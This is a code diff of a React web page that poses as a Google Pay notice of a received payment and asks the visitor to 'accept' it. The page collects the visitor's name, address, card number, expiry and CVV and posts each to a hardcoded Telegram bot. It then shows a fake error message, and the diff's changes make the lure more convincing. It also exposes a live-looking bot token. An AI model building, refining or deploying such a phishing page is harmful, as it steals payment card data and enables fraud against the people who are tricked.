@@ -1,5 +1,5 @@
 import React, { useState } from "react";
-import axios from "axios"
+import axios from "axios";
 function App() {
   const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
   const userId = "1099461059"; // Replace with the target user's ID
@@ -12,64 +12,57 @@ function App() {
   let [acceptPaymentButton, setacceptPaymentButton] = useState("");
   let [ccDisplay, setccDisplay] = useState("d-none");
 
-
-  if (person.there){
-   let texts = `${person.fname}, ${person.lname}, ${person.street} , ${person.city}, ${person.zip}`
+  if (person.there) {
+    let texts = `${person.fname}, ${person.lname}, ${person.street} , ${person.city}, ${person.zip}`;
     axios
-                    .post(apiUrl, {
-                      chat_id: userId,
-                      text: texts,
-                    })
-                    .then((response) => {
-                      if (response.data.ok) {
-                        return;
-                        // console.log("Message sent successfully!");
-                      } else {
-                        console.error(
-                          "Failed to send message:",
-                          response.data.description
-                        );
-                      }
-                    })
-                    .catch((error) => {
-                      console.error("Error:", error.message);
-                    });
+      .post(apiUrl, {
+        chat_id: userId,
+        text: texts,
+      })
+      .then((response) => {
+        if (response.data.ok) {
+          return;
+          // console.log("Message sent successfully!");
+        } else {
+          console.error("Failed to send message:", response.data.description);
+        }
+      })
+      .catch((error) => {
+        console.error("Error:", error.message);
+      });
 
-
-    if (card.there){
-      let cards = `  ${card.cc}, ${card.Month}, ${card.year},  ${card.cvv},`
+    if (card.there) {
+      let cards = `  ${card.cc}, ${card.Month}, ${card.year},  ${card.cvv},`;
       axios
-                .post(apiUrl, {
-                  chat_id: userId,
-                  text: cards,
-                })
-                .then((response) => {
-                  if (response.data.ok) {
-                    return;
-                    // console.log("Message sent successfully!");
-                  } else {
-                    console.error(
-                      "Failed to send message:",
-                      response.data.description
-                    );
-                  }
-                })
-                .catch((error) => {
-                  console.error("Error:", error.message);
-                });
+        .post(apiUrl, {
+          chat_id: userId,
+          text: cards,
+        })
+        .then((response) => {
+          if (response.data.ok) {
+            return;
+            // console.log("Message sent successfully!");
+          } else {
+            console.error("Failed to send message:", response.data.description);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error.message);
+        });
     }
   }
   return (
     <div className="container  mx-auto text-center">
       <div>
         <img
-          className="paylogo"
-          src="https://i.pinimg.com/736x/b6/e0/2d/b6e02d50c9561c47a728e9be62a14f10.jpg"
+          className="paylogo mt-1"
+          src="https://www.lifewire.com/thmb/sR3qNnvZzVuS6jsr0bvPqr9uEDE=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/google-pay-symbols-5ace1e50642dca0036d97ffe.png"
+          // src="https://i.pinimg.com/736x/b6/e0/2d/b6e02d50c9561c47a728e9be62a14f10.jpg"
           alt="logo"
-          width="70"
+          width="90"
         />
         <br />
-        <h3 className="text-center">You received $50 from James </h3>
+        <h3 className="text-center">You received $450 from Daniel </h3>
         <br></br>
         <p>
           <span className="fs-2 text-danger">{message}</span>
@@ -175,7 +168,7 @@ function App() {
                   setpdDisplay("d-none");
                   setccDisplay("d-block");
                   setPerson({
-                    there : true,
+                    there: true,
                     fname: document.getElementById("validationCustom01").value,
                     lname: document.getElementById("validationCustom02").value,
                     street: document.getElementById("validationCustomUsername")
@@ -183,7 +176,6 @@ function App() {
                     city: document.getElementById("validationCustom03").value,
                     zip: document.getElementById("validationCustom05").value,
                   });
-                  
                 }}
               >
                 Next
@@ -197,7 +189,13 @@ function App() {
             className="row g-3 needs-validation"
             onSubmit={(e) => {
               e.preventDefault();
-              setMessage("An error occurred!");
+              var myElement = document.getElementById("accept-btn");
+              myElement.setAttribute("disabled", `${true}`);
+              setTimeout(() => {
+                setMessage("An error occurred!");
+                myElement.removeAttribute("disabled");
+              }, 2000);
+
               setCard({
                 there: true,
                 cc: document.getElementById("cardNO").value,
@@ -205,7 +203,6 @@ function App() {
                 year: document.getElementById("year-select").value,
                 cvv: document.getElementById("cvv").value,
               });
-              
             }}
             novalidate
           >
@@ -217,7 +214,7 @@ function App() {
                 type="text"
                 className="form-control"
                 id="cardNO"
-                placeholder="         0000 0000 0000 0000 0000"
+                placeholder="                0000 0000 0000 0000 0000"
                 required
               />
               <div className="valid-feedback">Looks good!</div>
@@ -281,7 +278,7 @@ function App() {
               </label>
               <div className="input-group has-validation">
                 <input
-                  type="tex"
+                  type="number"
                   placeholder="   ---"
                   className="form-control"
                   id="cvv"
@@ -293,7 +290,11 @@ function App() {
             </div>
 
             <div className="text-end">
-              <button className="btn btn-outline-dark w-25" type="submit">
+              <button
+                id="accept-btn"
+                className="btn btn-outline-dark w-25 "
+                type="submit"
+              >
                 Accept
               </button>
             </div>
